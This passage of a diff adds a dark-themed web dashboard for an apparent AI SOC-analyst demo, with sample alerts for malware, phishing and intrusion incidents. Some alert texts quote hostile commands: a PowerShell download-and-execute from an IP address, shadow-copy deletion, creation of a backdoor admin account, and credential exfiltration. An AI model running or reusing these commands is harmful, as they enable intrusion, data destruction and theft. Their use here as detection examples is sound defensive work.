@@ -1,0 +1,661 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>SentinelAI — Autonomous SOC Analyst</title>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&family=Syne:wght@400;600;700;800&display=swap" rel="stylesheet">
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --bg:#05080d;
+  --surface:#0a0f18;
+  --surface2:#0f1724;
+  --border:#162030;
+  --border2:#1e3050;
+  --accent:#00e5ff;
+  --accent-dim:rgba(0,229,255,0.12);
+  --red:#ff3d5a;
+  --red-dim:rgba(255,61,90,0.12);
+  --orange:#ff8c00;
+  --orange-dim:rgba(255,140,0,0.1);
+  --green:#00ff88;
+  --green-dim:rgba(0,255,136,0.08);
+  --yellow:#ffe066;
+  --text:#d0dcea;
+  --text2:#7a92b0;
+  --text3:#3d5470;
+  --mono:'JetBrains Mono',monospace;
+  --sans:'Syne',sans-serif;
+}
+
+html,body{height:100%;overflow:hidden;background:var(--bg);color:var(--text);font-family:var(--sans)}
+
+/* Scanline overlay */
+body::after{
+  content:'';position:fixed;inset:0;pointer-events:none;z-index:9999;
+  background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,0.03) 2px,rgba(0,0,0,0.03) 4px);
+}
+
+/* Grid bg */
+body::before{
+  content:'';position:fixed;inset:0;pointer-events:none;
+  background-image:linear-gradient(rgba(0,229,255,0.025) 1px,transparent 1px),linear-gradient(90deg,rgba(0,229,255,0.025) 1px,transparent 1px);
+  background-size:48px 48px;
+}
+
+.layout{display:flex;flex-direction:column;height:100vh;position:relative;z-index:1}
+
+/* ── TOPBAR ── */
+.topbar{
+  display:flex;align-items:center;gap:24px;
+  padding:0 24px;height:56px;
+  background:var(--surface);
+  border-bottom:1px solid var(--border2);
+  flex-shrink:0;
+}
+.brand{display:flex;align-items:center;gap:10px}
+.brand-icon{
+  width:32px;height:32px;border-radius:6px;
+  background:linear-gradient(135deg,#00e5ff,#0066cc);
+  display:flex;align-items:center;justify-content:center;font-size:16px;
+}
+.brand-name{font-family:var(--mono);font-size:15px;font-weight:700;color:var(--accent);letter-spacing:3px}
+.brand-sub{font-size:9px;color:var(--text3);letter-spacing:4px;text-transform:uppercase;margin-top:1px}
+
+.topbar-stats{display:flex;gap:2px;margin-left:auto}
+.tstat{
+  display:flex;flex-direction:column;align-items:center;justify-content:center;
+  padding:4px 18px;border-left:1px solid var(--border);
+}
+.tstat:first-child{border-left:none}
+.tstat-val{font-family:var(--mono);font-size:18px;font-weight:700;line-height:1}
+.tstat-label{font-size:9px;color:var(--text3);letter-spacing:2px;text-transform:uppercase;margin-top:3px}
+
+.live-badge{
+  display:flex;align-items:center;gap:6px;
+  padding:4px 12px;border-radius:4px;
+  border:1px solid rgba(0,255,136,0.3);
+  background:rgba(0,255,136,0.06);
+  font-family:var(--mono);font-size:10px;color:var(--green);letter-spacing:2px;
+}
+.live-dot{width:6px;height:6px;border-radius:50%;background:var(--green);animation:livepulse 1.4s infinite}
+@keyframes livepulse{0%,100%{opacity:1;box-shadow:0 0 8px var(--green)}50%{opacity:0.3;box-shadow:none}}
+
+/* ── BODY ── */
+.body{display:flex;flex:1;overflow:hidden}
+
+/* ── SIDEBAR ── */
+.sidebar{
+  width:300px;flex-shrink:0;
+  background:var(--surface);border-right:1px solid var(--border2);
+  display:flex;flex-direction:column;overflow:hidden;
+}
+.sidebar-head{
+  padding:12px 16px 10px;border-bottom:1px solid var(--border);
+  display:flex;align-items:center;justify-content:space-between;
+}
+.sidebar-title{font-family:var(--mono);font-size:10px;color:var(--text3);letter-spacing:3px;text-transform:uppercase}
+.queue-badge{
+  font-family:var(--mono);font-size:10px;padding:2px 8px;border-radius:10px;
+  background:var(--accent-dim);color:var(--accent);border:1px solid rgba(0,229,255,0.2);
+}
+
+.search-wrap{padding:8px 12px;border-bottom:1px solid var(--border)}
+.search-wrap input{
+  width:100%;background:var(--bg);border:1px solid var(--border2);border-radius:4px;
+  color:var(--text);font-family:var(--mono);font-size:11px;padding:6px 10px;outline:none;
+  transition:border-color .2s;
+}
+.search-wrap input:focus{border-color:var(--accent)}
+.search-wrap input::placeholder{color:var(--text3)}
+
+.filters{padding:7px 12px;border-bottom:1px solid var(--border);display:flex;gap:5px;flex-wrap:wrap}
+.fbtn{
+  font-family:var(--mono);font-size:9px;padding:3px 8px;border-radius:3px;
+  border:1px solid var(--border2);background:transparent;color:var(--text3);
+  cursor:pointer;letter-spacing:1px;transition:all .15s;
+}
+.fbtn:hover,.fbtn.on{border-color:var(--accent);color:var(--accent);background:var(--accent-dim)}
+.fbtn.on-crit{border-color:var(--red);color:var(--red);background:var(--red-dim)}
+.fbtn.on-high{border-color:var(--orange);color:var(--orange);background:var(--orange-dim)}
+.fbtn.on-med{border-color:var(--accent);color:var(--accent);background:var(--accent-dim)}
+.fbtn.on-low{border-color:var(--green);color:var(--green);background:var(--green-dim)}
+
+.alert-scroll{flex:1;overflow-y:auto}
+.alert-scroll::-webkit-scrollbar{width:3px}
+.alert-scroll::-webkit-scrollbar-thumb{background:var(--border2)}
+
+.aitem{
+  padding:10px 16px;border-bottom:1px solid var(--border);
+  cursor:pointer;transition:all .15s;border-left:3px solid transparent;
+  animation:fadeSlide .3s ease both;
+}
+@keyframes fadeSlide{from{opacity:0;transform:translateX(-8px)}to{opacity:1;transform:none}}
+.aitem:hover{background:rgba(0,229,255,0.03)}
+.aitem.active{background:rgba(0,229,255,0.06);border-left-color:var(--accent)}
+.aitem-top{display:flex;align-items:center;gap:7px;margin-bottom:3px}
+.sbadge{
+  font-family:var(--mono);font-size:9px;padding:2px 5px;border-radius:2px;
+  font-weight:700;letter-spacing:1px;white-space:nowrap;flex-shrink:0;
+}
+.sc{background:var(--red-dim);color:var(--red);border:1px solid rgba(255,61,90,0.35)}
+.sh{background:var(--orange-dim);color:var(--orange);border:1px solid rgba(255,140,0,0.35)}
+.sm{background:var(--accent-dim);color:var(--accent);border:1px solid rgba(0,229,255,0.25)}
+.sl{background:var(--green-dim);color:var(--green);border:1px solid rgba(0,255,136,0.25)}
+.aname{font-size:12px;font-weight:600;color:var(--text);flex:1;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.ameta{font-family:var(--mono);font-size:10px;color:var(--text3)}
+.atype{font-size:10px;color:var(--text3);margin-top:2px}
+
+/* Input */
+.input-box{padding:10px 12px;border-top:1px solid var(--border2);background:var(--bg)}
+.input-box textarea{
+  width:100%;background:var(--surface);border:1px solid var(--border2);border-radius:5px;
+  color:var(--text);font-family:var(--mono);font-size:10px;padding:8px 10px;
+  resize:none;height:65px;outline:none;transition:border-color .2s;
+}
+.input-box textarea:focus{border-color:var(--accent)}
+.input-box textarea::placeholder{color:var(--text3)}
+.inv-btn{
+  margin-top:6px;width:100%;
+  background:linear-gradient(135deg,rgba(0,229,255,0.18),rgba(0,102,255,0.18));
+  border:1px solid rgba(0,229,255,0.4);color:var(--accent);
+  font-family:var(--mono);font-weight:700;font-size:11px;letter-spacing:3px;
+  padding:7px;border-radius:4px;cursor:pointer;transition:all .2s;text-transform:uppercase;
+}
+.inv-btn:hover{background:linear-gradient(135deg,rgba(0,229,255,0.3),rgba(0,102,255,0.3));box-shadow:0 0 20px rgba(0,229,255,0.2)}
+.inv-btn:disabled{opacity:0.4;cursor:not-allowed}
+
+/* ── DETAIL ── */
+.detail{flex:1;overflow-y:auto;padding:20px;padding-bottom:50px;display:block;}
+.detail::-webkit-scrollbar{width:8px}
+.detail::-webkit-scrollbar-thumb{background:var(--accent);border-radius:4px}
+
+.empty{
+  flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;
+  color:var(--text3);gap:14px;text-align:center;
+}
+.empty-icon{font-size:44px;opacity:0.25;filter:grayscale(1)}
+.empty-title{font-size:17px;font-weight:700;color:var(--text2)}
+.empty-sub{font-size:12px;max-width:300px;line-height:1.7;font-family:var(--mono)}
+
+/* Thinking */
+.thinking{
+  background:var(--surface);border:1px solid var(--border2);border-radius:8px;
+  padding:48px 20px;text-align:center;
+}
+.thinking-title{font-size:16px;font-weight:700;color:var(--text);margin-top:12px}
+.thinking-sub{font-size:11px;color:var(--text3);font-family:var(--mono);margin-top:6px;letter-spacing:1px}
+.dots{display:inline-flex;gap:6px;margin-top:16px}
+.dots span{width:7px;height:7px;border-radius:50%;background:var(--accent);animation:dot 1.2s infinite}
+.dots span:nth-child(2){animation-delay:.2s}
+.dots span:nth-child(3){animation-delay:.4s}
+@keyframes dot{0%,80%,100%{opacity:.15;transform:scale(0.8)}40%{opacity:1;transform:scale(1)}}
+
+/* Result sections */
+.section{background:var(--surface);border:1px solid var(--border2);border-radius:7px;overflow:hidden;animation:fadeIn .4s ease both}
+@keyframes fadeIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:none}}
+.section-head{
+  padding:9px 16px;border-bottom:1px solid var(--border);
+  font-family:var(--mono);font-size:10px;letter-spacing:2px;text-transform:uppercase;
+  color:var(--accent);display:flex;align-items:center;gap:8px;
+  background:rgba(0,229,255,0.04);
+}
+.section-body{padding:14px 16px}
+
+.alert-header{display:flex;align-items:center;gap:10px;flex-wrap:wrap}
+.alert-title{font-size:18px;font-weight:800;color:var(--text)}
+.alert-meta-tag{margin-left:auto;font-family:var(--mono);font-size:10px;color:var(--text3)}
+
+/* Score cards */
+.score-row{display:flex;gap:10px;flex-wrap:wrap}
+.scard{
+  flex:1;min-width:90px;background:var(--bg);border:1px solid var(--border2);
+  border-radius:6px;padding:12px;text-align:center;
+}
+.scard-label{font-family:var(--mono);font-size:9px;color:var(--text3);letter-spacing:2px;text-transform:uppercase;margin-bottom:7px}
+.scard-val{font-family:var(--mono);font-size:20px;font-weight:700;line-height:1}
+.scard-sub{font-size:10px;color:var(--text3);margin-top:2px}
+.bar{height:3px;background:var(--border2);border-radius:2px;margin-top:8px;overflow:hidden}
+.bar-fill{height:100%;border-radius:2px;transition:width 1.2s cubic-bezier(.2,1,.4,1)}
+
+/* MITRE */
+.mitre-wrap{display:flex;flex-wrap:wrap;gap:7px}
+.mtag{
+  background:var(--bg);border:1px solid var(--border2);border-radius:4px;
+  padding:6px 10px;font-family:var(--mono);font-size:10px;
+  transition:border-color .2s;
+}
+.mtag:hover{border-color:var(--accent)}
+.mtag-tactic{color:var(--text3);font-size:8px;text-transform:uppercase;letter-spacing:1px}
+.mtag-tech{color:var(--accent);margin-top:3px;font-size:10px}
+
+/* IOCs */
+.ioc-wrap{display:flex;flex-direction:column;gap:5px}
+.ioc-row{
+  display:flex;align-items:center;gap:10px;
+  background:var(--bg);border:1px solid var(--border);border-radius:4px;padding:7px 12px;
+  transition:border-color .2s;
+}
+.ioc-row:hover{border-color:var(--border2)}
+.ioc-type{
+  font-family:var(--mono);font-size:8px;padding:2px 6px;border-radius:2px;
+  background:rgba(255,140,0,0.1);color:var(--orange);border:1px solid rgba(255,140,0,0.25);
+  letter-spacing:1px;text-transform:uppercase;white-space:nowrap;flex-shrink:0;
+}
+.ioc-val{font-family:var(--mono);font-size:11px;color:var(--text);flex:1;word-break:break-all}
+.ioc-mal{font-family:var(--mono);font-size:9px;white-space:nowrap;flex-shrink:0}
+
+/* Timeline */
+.tl{display:flex;flex-direction:column}
+.tl-row{display:flex;gap:12px;padding:7px 0;position:relative}
+.tl-row::before{content:'';position:absolute;left:6px;top:22px;bottom:-7px;width:1px;background:var(--border)}
+.tl-row:last-child::before{display:none}
+.tl-dot{width:13px;height:13px;border-radius:50%;border:2px solid var(--accent);background:var(--bg);flex-shrink:0;margin-top:3px}
+.tl-time{font-family:var(--mono);font-size:9px;color:var(--text3);margin-bottom:2px}
+.tl-text{font-size:12px;line-height:1.5;color:var(--text2)}
+
+/* Recommendations */
+.reco-wrap{display:flex;flex-direction:column;gap:7px}
+.reco-row{
+  display:flex;gap:12px;align-items:flex-start;
+  background:var(--bg);border-radius:4px;border-left:3px solid var(--green);
+  padding:9px 12px;
+}
+.reco-num{font-family:var(--mono);font-size:12px;color:var(--green);font-weight:700;flex-shrink:0}
+.reco-text{font-size:12px;line-height:1.6;color:var(--text2)}
+
+/* Raw log */
+.raw-log{
+  font-family:var(--mono);font-size:10px;color:var(--text3);
+  white-space:pre-wrap;line-height:1.8;background:var(--bg);
+  border-radius:4px;padding:12px;border:1px solid var(--border);
+}
+
+/* Error */
+.err-box{
+  background:var(--surface);border:1px solid rgba(255,61,90,0.3);border-radius:7px;
+  padding:32px 20px;text-align:center;color:var(--red);
+}
+.err-box p{font-family:var(--mono);font-size:12px;margin-top:8px;color:var(--text3)}
+
+/* --- DETAILED CYBER-NEXUS DASHBOARD STYLES --- */
+.metrics-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 16px; margin-bottom: 24px; padding-top: 10px; }
+.metric-card { background: var(--surface2); border: 1px solid var(--border2); border-radius: 8px; padding: 20px; display: flex; flex-direction: column; position: relative; overflow: hidden; }
+.metric-card::before { content: ''; position: absolute; top: 0; left: 0; right: 0; height: 3px; background: var(--mcolor, var(--text3)); opacity: 0.8; }
+.m-label { font-size: 11px; color: var(--text3); text-transform: uppercase; letter-spacing: 1px; margin-bottom: 8px; font-weight: 700; font-family: var(--mono); }
+.m-value { font-size: 24px; font-weight: 700; font-family: var(--mono); color: var(--mcolor, #fff); }
+
+.detail-section { background: var(--surface); border: 1px solid var(--border2); border-radius: 8px; margin-bottom: 20px; overflow: hidden; }
+.ds-header { background: rgba(0,229,255,0.02); padding: 16px 20px; border-bottom: 1px solid var(--border2); display: flex; align-items: center; gap: 12px; }
+.ds-header h3 { font-size: 15px; font-weight: 700; color: #fff; font-family: var(--sans); }
+.ds-body { padding: 20px; }
+
+.analysis-text { font-size: 14px; line-height: 1.8; color: var(--text); white-space: pre-wrap; font-family: var(--sans); }
+
+.mitre-grid { display: flex; flex-wrap: wrap; gap: 10px; }
+.mitre-tag { background: rgba(157, 78, 221, 0.05); border: 1px solid rgba(157, 78, 221, 0.3); padding: 10px 16px; border-radius: 6px; }
+.mt-tactic { font-size: 11px; color: var(--text3); text-transform: uppercase; letter-spacing: 1px; margin-bottom: 4px; font-family: var(--mono); }
+.mt-tech { font-family: var(--mono); font-size: 13px; color: #b366ff; font-weight: 500; }
+
+.ioc-table { width: 100%; border-collapse: collapse; }
+.ioc-table th { text-align: left; padding: 12px; border-bottom: 1px solid var(--border2); font-size: 12px; color: var(--text3); text-transform: uppercase; font-family: var(--mono); }
+.ioc-table td { padding: 16px 12px; border-bottom: 1px solid rgba(255,255,255,0.03); font-family: var(--mono); font-size: 13px; color: var(--text); }
+.ioc-table tr:last-child td { border-bottom: none; }
+.ioc-mal-badge { color: var(--red); background: rgba(255,0,60,0.1); border: 1px solid rgba(255,0,60,0.3); padding: 4px 8px; border-radius: 4px; font-size: 11px; white-space: nowrap; }
+.ioc-clean-badge { color: var(--green); background: rgba(0,255,136,0.1); border: 1px solid rgba(0,255,136,0.3); padding: 4px 8px; border-radius: 4px; font-size: 11px; white-space: nowrap; }
+
+.timeline-new { display: flex; flex-direction: column; gap: 20px; position: relative; padding-left: 20px; }
+.timeline-new::before { content: ''; position: absolute; left: 4px; top: 8px; bottom: 8px; width: 2px; background: var(--border2); }
+.tln-item { position: relative; }
+.tln-dot { position: absolute; left: -21px; top: 4px; width: 10px; height: 10px; border-radius: 50%; background: var(--accent); box-shadow: 0 0 10px rgba(0,229,255,0.4); }
+.tln-time { font-family: var(--mono); font-size: 12px; color: var(--accent); margin-bottom: 6px; }
+.tln-desc { font-size: 14px; color: var(--text); line-height: 1.5; font-family: var(--sans); }
+
+.reco-list { display: flex; flex-direction: column; gap: 12px; }
+.reco-item { display: flex; gap: 16px; align-items: flex-start; background: rgba(0,255,136,0.05); border: 1px solid rgba(0,255,136,0.15); padding: 16px; border-radius: 8px; }
+.reco-num-new { font-family: var(--mono); font-size: 16px; font-weight: 700; color: var(--green); background: rgba(0,255,136,0.1); width: 32px; height: 32px; border-radius: 50%; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
+.reco-desc-new { font-size: 14px; color: var(--text); line-height: 1.6; align-self: center; font-family: var(--sans); }
+</style>
+</head>
+<body>
+<div class="layout">
+
+  <!-- TOPBAR -->
+  <div class="topbar">
+    <div class="brand">
+      <div class="brand-icon">🛡️</div>
+      <div>
+        <div class="brand-name">SENTINEL<span style="color:#fff">AI</span></div>
+        <div class="brand-sub">Autonomous SOC Analyst</div>
+      </div>
+    </div>
+    <div class="topbar-stats">
+      <div class="tstat"><div class="tstat-val" style="color:var(--red)" id="sc">0</div><div class="tstat-label">Critical</div></div>
+      <div class="tstat"><div class="tstat-val" style="color:var(--orange)" id="sh">0</div><div class="tstat-label">High</div></div>
+      <div class="tstat"><div class="tstat-val" style="color:var(--accent)" id="sm">0</div><div class="tstat-label">Medium</div></div>
+      <div class="tstat"><div class="tstat-val" style="color:var(--text)" id="st">0</div><div class="tstat-label">Total</div></div>
+    </div>
+    <div class="live-badge"><span class="live-dot"></span>LIVE</div>
+  </div>
+
+  <div class="body">
+
+    <!-- SIDEBAR -->
+    <div class="sidebar">
+      <div class="sidebar-head">
+        <div class="sidebar-title">⚠ Alert Queue</div>
+        <div class="queue-badge" id="qb">0</div>
+      </div>
+      <div class="search-wrap">
+        <input type="text" id="srch" placeholder="🔍  search alerts..." oninput="render()">
+      </div>
+      <div class="filters">
+        <button class="fbtn on" id="fb-all" onclick="setF('all',this)">ALL</button>
+        <button class="fbtn" id="fb-critical" onclick="setF('critical',this)">CRIT</button>
+        <button class="fbtn" id="fb-high" onclick="setF('high',this)">HIGH</button>
+        <button class="fbtn" id="fb-medium" onclick="setF('medium',this)">MED</button>
+        <button class="fbtn" id="fb-low" onclick="setF('low',this)">LOW</button>
+      </div>
+      <div class="alert-scroll" id="alist"></div>
+      <div class="input-box">
+        <textarea id="ainput" placeholder="Paste alert JSON, log line, or describe an incident...&#10;Press Investigate to run AI analysis."></textarea>
+        <button class="inv-btn" id="invbtn" onclick="submitCustom()">⚡ Investigate Alert</button>
+      </div>
+    </div>
+
+    <!-- DETAIL -->
+    <div class="detail" id="detail">
+      <div class="empty">
+        <div class="empty-icon">🔬</div>
+        <div class="empty-title">Select an alert to investigate</div>
+        <div class="empty-sub">35 alerts loaded across Malware, Phishing, Network Intrusion & Identity threats. Click any to trigger autonomous AI investigation.</div>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<script>
+const ALERTS=[
+  // MALWARE / ENDPOINT
+  {id:1,name:"Cobalt Strike Beacon C2",sev:"critical",type:"Malware / Endpoint",time:"2m ago",raw:`Alert: Cobalt Strike Beacon C2 Communication\nHost: WORKSTATION-FINANCE-04 (10.0.1.84)\nProcess: rundll32.exe (PID 4821) spawned by winword.exe\nOutbound: 185.220.101.45:443 (TOR exit node)\nDNS: update.microsoftsvc[.]net (lookalike domain)\nFile: C:\\ProgramData\\MicrosoftUpdate\\svchost32.exe\nParent: WINWORD.EXE "Q3_Report.docx"\nUser: jsmith@corp.local (Finance Dept)\nEDR Score: 98/100 Malicious`},
+  {id:2,name:"Ransomware File Encryption",sev:"critical",type:"Malware / Endpoint",time:"5m ago",raw:`Alert: Ransomware - Mass File Encryption Detected\nHost: FILE-SERVER-01 (10.0.0.50)\nProcess: svhost.exe (not svchost) PID 7823\nFiles Modified: 14,823 in 4 minutes (.docx → .DARKBIT)\nShadow Copies: vssadmin delete shadows /all executed\nRansom Note: C:\\Users\\Public\\README_DECRYPT.txt\nC2: HTTPS to 5.188.86.114:443\nRegistry: HKLM\\CurrentControlSet\\Run modified`},
+  {id:3,name:"Mimikatz LSASS Dump",sev:"critical",type:"Malware / Endpoint",time:"11m ago",raw:`Alert: Credential Dumping - LSASS Memory Access\nHost: DC-PRIMARY-01 (10.0.0.10) - Domain Controller\nProcess: mim.exe accessed lsass.exe memory (PID 892)\nMethod: SeDebugPrivilege + MiniDumpWriteDump API\nOutput: C:\\Temp\\lsass.dmp (47MB written)\nAlso: procdump64.exe run 30s earlier\nParent: cmd.exe via psexec service\nUser: CORP\\admintools (service account)`},
+  {id:4,name:"PowerShell Empire Stager",sev:"critical",type:"Malware / Endpoint",time:"18m ago",raw:`Alert: PowerShell Empire Framework Detected\nHost: LAPTOP-EXEC-12 (192.168.1.205)\nCommand: powershell.exe -NoP -sta -NonI -W Hidden -Enc <2048-char base64>\nDecoded: IEX (New-Object Net.WebClient).DownloadString('http://93.184.216.34/stage2')\nAMSI Bypass: amsiInitFailed patch detected\nPersistence: Scheduled task "WindowsUpdate" created\nBeacon: Every 5 seconds to C2\nUser: CEO laptop - mwilliams@corp.local`},
+  {id:5,name:"Malicious USB Autorun",sev:"high",type:"Malware / Endpoint",time:"25m ago",raw:`Alert: USB Device + Malicious Autorun\nHost: HR-WORKSTATION-07 (10.0.3.21)\nDevice: USB Mass Storage inserted 09:14 AM\nAutorun: setup.exe from E:\\ executed within 3s\nChild: cmd.exe → net user hacker P@ssw0rd /add\n        net localgroup administrators hacker /add\nFile: C:\\Windows\\Temp\\backdoor.dll dropped\nUser: lgarcia@corp.local (HR Department)`},
+  {id:6,name:"Rootkit Kernel Driver Load",sev:"critical",type:"Malware / Endpoint",time:"33m ago",raw:`Alert: Suspicious Kernel Driver Loaded\nHost: WORKSTATION-DEV-03 (10.0.4.15)\nDriver: maldrv.sys via sc.exe create/start\nSignature: Invalid - certificate revoked 2022\nHash: SHA256 a3f5d2b1c8e9f4a6... (41/72 VT engines)\nCapabilities: DKOM - hiding processes from taskmgr\nTime: 3:27 AM (off hours)\nNetwork: Raw socket connections established`},
+  {id:7,name:"Fileless Malware Registry",sev:"high",type:"Malware / Endpoint",time:"41m ago",raw:`Alert: Fileless Malware via Registry Persistence\nHost: ACCOUNTING-PC-09 (10.0.1.90)\nKey: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nValue: powershell -ep bypass -w hidden -c "IEX ([System.Text.Encoding]::Unicode.GetString(...))"\nPayload stored in registry - no disk artifacts\nNetwork: Periodic calls to pastebin[.]com/raw/xK9mP2qL\nSurvives reboots via registry run key`},
+  {id:8,name:"Supply Chain NPM Package",sev:"critical",type:"Malware / Endpoint",time:"3h ago",raw:`Alert: Malicious NPM Package in CI/CD Pipeline\nHost: CICD-BUILD-SERVER-01 (10.0.6.10)\nPackage: lodash-utils v2.1.4 (typosquat of lodash)\nAction: Postinstall script exfiltrates env variables\nStolen: AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, DATABASE_URL\nExfil: https://lodash-cdn[.]com/telemetry\nImpact: 3 S3 buckets set to public-read after key theft`},
+  {id:9,name:"Log Tampering & Audit Evasion",sev:"critical",type:"Malware / Endpoint",time:"4h ago",raw:`Alert: Security Log Tampering Detected\nHost: DC-PRIMARY-01 (10.0.0.10)\nAction: Windows Event Log service stopped\nCleared: Security, System, Application logs via wevtutil\nPowerShell History: Deleted from PSReadLine\nSysmon: Service also stopped\nUSN Journal: Disabled via fsutil\nGap: 47 minutes zero logging (10:14 PM - 11:01 PM)\nContext: Follows earlier Mimikatz alert on same host`},
+
+  // PHISHING / EMAIL
+  {id:10,name:"CEO Fraud Wire Transfer",sev:"high",type:"Phishing / Email",time:"15m ago",raw:`Alert: BEC / CEO Fraud Email Detected\nFrom: ceo-secure@microsoft-corp365[.]com\nDisplay Name: "David Chen - CEO" (spoofed)\nTo: sarah.finance@corp.local (CFO)\nSubject: URGENT - Wire Transfer Required Today\nBody references correct internal acquisition project\nLink: hxxps://docusign-secure[.]net/sign?ref=ACQ2024\nAttachment: Wire_Instructions_Confidential.pdf\nSender IP: 91.108.4.175 (Telegram infrastructure)\nSPF: FAIL | DKIM: FAIL | DMARC: Reject bypassed`},
+  {id:11,name:"HR Spearphishing Campaign",sev:"high",type:"Phishing / Email",time:"28m ago",raw:`Alert: Spearphishing - HR Department Targeted\nTargets: 14 HR employees received identical email\nFrom: careers@linkedin-jobs-notifications[.]com\nSubject: "Action Required: New Employee Onboarding Portal"\nLink: hxxps://corp-hr-portal[.]xyz/login (credential harvester)\nResult: 3 employees submitted credentials\nSession Tokens: Captured before MFA challenge\nTiming: Monday 8:57 AM (peak open rate window)`},
+  {id:12,name:"Malicious Macro - Excel",sev:"high",type:"Phishing / Email",time:"44m ago",raw:`Alert: Malicious Office Macro Executed\nFrom: invoice@trusted-vendor[.]net (compromised vendor)\nAttachment: Invoice_Oct2024.xlsm\nUser: Enabled macros (clicked "Enable Content")\nMacro: Shell → mshta.exe\nURL: hxxp://185.234.218.23/payload.hta\nDownloaded: RevengeRAT dropper (45KB)\nChain: EXCEL.EXE → mshta.exe → cmd.exe → powershell.exe\nHost: PROCUREMENT-PC-02 (10.0.2.44)`},
+  {id:13,name:"O365 EvilProxy Credential Harvest",sev:"medium",type:"Phishing / Email",time:"1h ago",raw:`Alert: Microsoft 365 Credential Harvesting\nTargets: 15 employees received fake M365 login\nFrom: noreply@microsoftonIine[.]com (capital i not L)\nKit: EvilProxy reverse proxy detected\nTokens: OAuth tokens captured (bypasses MFA)\nCompromised: 2 confirmed accounts\nPost-compromise: Inbox rules forwarding to gmail.com\nOAuth: App "PDF Converter Pro" granted Mail.Read`},
+  {id:14,name:"QR Code Phishing (Quishing)",sev:"medium",type:"Phishing / Email",time:"1.2h ago",raw:`Alert: QR Code Phishing Attack\nMethod: QR code in PDF bypasses email scanners\nSubject: "Scan to verify your Microsoft Authenticator"\nQR Dest: hxxps://aka-ms-verify[.]com/auth\nScanned: 4 employees on personal phones (outside MDM)\nTarget: Microsoft Authenticator seed phrase\nRoute: Cloudflare Worker → attacker server\nVolume: 47 emails to @corp.local in 20 minutes`},
+  {id:15,name:"HTML Smuggling - AsyncRAT",sev:"high",type:"Phishing / Email",time:"1.5h ago",raw:`Alert: HTML Smuggling Payload Delivered\nAttachment: Shipping_Notification.html\nMethod: JavaScript Blob() reconstructs payload in browser\nBypassed: Email AV scan (HTML appeared benign)\nOn Open: Downloaded ISO → AsyncRAT installer\nC2: 194.165.16.77:8080 (AsyncRAT infrastructure)\nVictims: LOGISTICS-PC-04, LOGISTICS-PC-07`},
+  {id:16,name:"Vendor Email Compromise",sev:"high",type:"Phishing / Email",time:"2h ago",raw:`Alert: Vendor Email Account Compromise\nCompromised Vendor: billing@acme-supplies.com\nAction: Attacker changed payment bank details in email thread\nTarget: AP department - 3 pending invoices totaling $240,000\nMethod: Replied to existing legitimate email thread (high trust)\nLookalike Domain: acme-supp1ies.com in reply-to header\nOne Payment: $80,000 already wired to fraudulent account\nDetection: Vendor called to confirm payment status`},
+
+  // NETWORK INTRUSION
+  {id:17,name:"Lateral Movement via SMB",sev:"medium",type:"Network Intrusion",time:"32m ago",raw:`Alert: Lateral Movement via SMB\nSource: WORKSTATION-IT-02 (10.0.2.15)\nActivity: SMB connections to 14 hosts in 4 minutes\nTool: PsExec (ADMIN$ share access)\nPassword reuse: local admin across multiple hosts\nCommands: net user /domain, net group "Domain Admins"\nTargets: Finance & HR VLANs\nTime: 02:14 AM (off hours)`},
+  {id:18,name:"Internal Network Port Scan",sev:"medium",type:"Network Intrusion",time:"48m ago",raw:`Alert: Internal Reconnaissance - Port Scan\nSource: 10.0.3.45 (GUEST-WIFI - unknown device)\nType: SYN scan (nmap -sS signature)\nScope: Ports 1-65535 on 10.0.0.0/16\nSpeed: 847 hosts scanned in 3 minutes\nFound: SSH/22, RDP/3389, SMB/445 services\nOpen RDP: 10.0.0.22, 10.0.0.31, 10.0.0.44\nSource MAC: Not in asset inventory (rogue device)`},
+  {id:19,name:"DNS C2 Tunneling",sev:"high",type:"Network Intrusion",time:"55m ago",raw:`Alert: DNS Tunneling / C2 Beaconing\nHost: MARKETING-PC-11 (10.0.5.88)\nPattern: DNS query every 60 seconds (automated)\nDomain: *.update-cdn-delivery[.]com (DGA subdomains)\nSubdomain: 32-char hex strings (data encoded)\nVolume: 4,200 DNS queries in 6 hours (baseline: 50/hr)\nExfil: ~2.3MB via DNS TXT records\nResolver: Direct to 8.8.8.8 (bypassing internal DNS)\nTool: dnscat2 / iodine signature match`},
+  {id:20,name:"RDP Brute Force - External",sev:"high",type:"Network Intrusion",time:"1h ago",raw:`Alert: RDP Brute Force Attack\nTarget: VPN-GATEWAY-01 (203.0.113.5) internet-facing\nSource: 91.92.251.103 (Russia/TOR)\nAttempts: 2,847 login attempts in 8 minutes\nUsernames: admin, administrator, rdp, user, backup\nSUCCESS: 1 login - account "backup_admin"\nPost-Login: net user, whoami, systeminfo\nSession: 14 minutes active\nNote: backup_admin password unchanged since 2019`},
+  {id:21,name:"47GB Data Exfiltration",sev:"critical",type:"Network Intrusion",time:"1.1h ago",raw:`Alert: Anomalous Outbound Data Transfer\nSource: DB-SERVER-PROD (10.0.0.25)\nDestination: 45.33.32.156 (Linode VPS) port 443\nVolume: 47.3GB in 2.5 hours (baseline: 200MB/day)\nProtocol: HTTPS (self-signed cert, issued today)\nProcess: python3.exe performing transfer\nTime: 1:00 AM - 3:30 AM (off-hours)\nData: .sql, .csv, .json (database backup pattern)\nDLP: SSN/PAN patterns detected in stream`},
+  {id:22,name:"ARP Spoofing MITM",sev:"high",type:"Network Intrusion",time:"2h ago",raw:`Alert: ARP Spoofing / Man-in-the-Middle\nSource: 10.0.1.77 (unknown rogue device)\nAttack: Gratuitous ARP replies to entire /24\nClaiming: Gateway IP 10.0.1.1 = attacker MAC\nAffected: 23 workstations rerouting traffic\nCaptured: HTTP, FTP, LDAP (cleartext)\nLDAP: 3 Active Directory credentials intercepted\nDuration: 47 minutes before detection\nRoot Cause: Dynamic ARP inspection not enabled`},
